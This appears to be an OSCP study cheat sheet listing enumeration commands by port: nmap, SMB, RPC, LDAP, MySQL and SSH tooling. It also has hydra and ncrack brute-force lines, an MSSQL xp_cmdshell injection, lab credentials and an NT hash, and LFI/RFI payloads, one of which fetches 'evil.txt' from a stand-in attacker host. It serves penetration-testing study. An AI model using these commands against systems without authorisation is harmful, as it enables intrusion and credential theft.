---
description: All you need to know about basic host-based enumeration for OSCP
---

# Enumeration (정보 수집 및 열거)

## **Network Discovery**

### Common Nmap Scan

```
nmap -sV -sT -sC -T5 -v -A $targetip
```

* **-sV** (Version detection)
* \-**sT** (TCP connect scan)
* \-**sC** (Performs a script scan using the default set of scripts)
* **-T5**  (Insane mode)
* **-v** (Increase verbosity level)
* **-A** (OS Detection)

#### **All TCP port scan**

```
nmap -p- -sT -v $targetip
```

#### **All UDP Port Scan (With Service and Script Scan)**

```
nmap -p- -sV -sU -sC $targetip
```

#### **100 most** **common ports**

```
nmap $targetip -F 100
```

### **Nmap Script Scan**

#### **Find the nse scripts**

```
locate *.nse | grep <script.nse>
```

For example, the below command will find smb scripts.

```
locate *.nse | grep smb
```

#### **Scan using a specific NSE script**

```
nmap -sV -p 443 --script=ssl-heartbleed.nse $targetip
```

For example, below command will find any smb scripts running on port 139 & 445.

```
nmap -p 139,445 --script=smb-* $targetip
```

All smb scripts:&#x20;

```
nmap --script smb-vuln* -p 139,445 [ip] 
```

SMB share paths enumeration:

```
nmap --script smb-enum-shares -p 139,445 [ip]
```

&#x20;Using Metasploit portscan

```
use auxiliary/scanner/portscan/
```

## **Service Discovery**

### Port 80 & 443 - Web Discovery

#### Find SSL Heartbleed Vulnerablity

```
sslscan $targetip:443
```

```
nmap -sV --script=ssl-heartbleed 192.168.101.8
```

#### Scan Web Servers

```
Nikto -h $targethost -p $targetport
```

#### Dictionary Attacks for finding hidden web objects

```
gobuster dir –url http://$targetip -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x aspx,php
```

You can also use the common web\_content list.

```
/usr/share/seclists/Discovery/Web_Content/common.txt
```

For cgi-bin,

```
gobuster dir –url http://$targetip/cgi-bin/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -x aspx,php
```

Or  for faster scan

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u 
http://$targetIP/FUZZ/something

```

ffuf Github link: [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf)

### Port 445 - SMB Discovery

#### To discover “All” of SMB

```
enum4linux -a $targetip
```

#### To discover the userlist

```
enum4linux -U $targetip
```

You can create a username list with awk.&#x20;

```
cat user.txt | awk -F'[][]' '{print $2}' >> users.txt
```

#### Bruteforce the share names

```
enum4linux -s file
```

#### To find Password Policy

```
enum4linux -p $targetip
```

#### Alternative samba enumeration using smbmap

```
smbmap -H $targetip -d $domain -R
```

You can download file by smbmap directly from the victim host

```
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --download "Users\SVC_TGS\Desktop\user.txt"
```

#### SMBCLIENT copying whole directory

```
mount -t cifs //IPADDESS/SHARE /mnt -o "user=SMBUSER,password=SMBPASS"
```

#### **Check the list of shares via SMB null session**

```
smbclient –list //$targetip/ -U ‘’ -N
```

#### Connect to a spefic share path you found

```
smbclient \\$targetip\\$share
```

smbclient to list out share paths with sambaNTPasswrod

```
smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/
```

&#x20;

{% hint style="info" %}
_Useful SMB commands_

* _get $file_ to extract file to your host.
* _put $file_ to inject file to the victim.
{% endhint %}

### Port 135 - RPC Discovery&#x20;

```
rpcclient -U "" $targetip
```

Then use the below commands for more information

* srvinfo
* enumdomusers
* getdompwinfo
* querydominfo
* netshareenum
* netshareenumall

```
rpcbind -p 192.168.1.101
```

### Port 389 & 636 for SSL  - LDAP Discovery

```
ldapsearch -h 192.168.1.101 -p 389 -x -b "dc=mywebsite,dc=com"
```

or using nmap

```
nmap -p 389 --script ldap-search ypuffy.htb
```



#### Port 21 - FTP Discovery

```
ftp $targetip
nc $targetip 21
```

FTP Commands List: [https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands](https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands)

### Port 3306 - MySQL <a href="#port-3306---mysql" id="port-3306---mysql"></a>

```
mysql --host=$targetip -u root -p
```

```
telnet 192.168.0.101 3306
```

{% hint style="info" %}
_ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server means only localhost can log in as root._
{% endhint %}

MYSQL Commands List : [http://cse.unl.edu/\~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html](http://cse.unl.edu/\~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html)

#### SQL Password Storage

You can check the web server configuration php file if it contains any credentials.

```
/var/www/html/configuration.php
```

### Port 3389 - RDP

RDP  to Windows

```
rdesktop -u $username -p $password <IP>
```

Ruby winrm package from

{% embed url="https://github.com/WinRb/WinRM" %}

```
gem install -r winrm
ruby winrm_shell.rb 
```

Bruteforce RDP

```
ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
```

### Port 21 - FTP

```
ftp $targetip
```

```
nc $targetip 21
```

### Port 22 - SSH

Information Gathering using nc&#x20;

```
nc -nv  10.11.1.71 22
```

![](broken-reference)

The target OS is "Ubuntu", using "OpenSSH v6.6" (and package is 2ubuntu2)

Login with SSH key

```
ssh -i id_rsa alice1978@ypuffy.htb
```

ssh-gen

```
/usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I root .ssh/id_rsa
```

Bruteforce SSH Credential with hydra

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip ssh -t 5
```



### Port 161 UDP - SNMP

```
snmpwalk -c public -v 1 10.10.10.116
```

To check if snmp port is opened &#x20;

```
nc -nv -u -z -w 1 10.11.1.73 160-162
```

### Port 88 - Kerberos

Bruteforce the username list with nmap script.

```
nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='HTB',userdb=/root/oscp/forest/users.txt 10.10.10.161
```

### Port 1433 -SQL

**Command Injection using nmap**

```
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,mssql.database=bankdb,ms-sql-xp-cmdshell.cmd="whoami" 10.11.1.31
```



### Telnet - 25

```
telnet $targetip 25
```

## Finding known exploits from Exploit-DB

To update to latest Exploit-DB

```
searchsploit -u 
```

To find a exploit

```
searchsploit $item
```

To copy the file to your current directory.

```
searchsploit -m $item 
```

To find item wihtout DOS attack

```
searchsploit apache 2.x | grep -v '/dos/'
```

## <mark style="color:blue;">**Local File inclusions**</mark>

Simple test if the target is vulnerable to LFI

```
http://target.com/?page=./../../../../../../../../../etc/passwd%00
```

Simple test if you can run a local script against the target

```
http://target.com/?page=http://hackerip/evil.txt%00
```
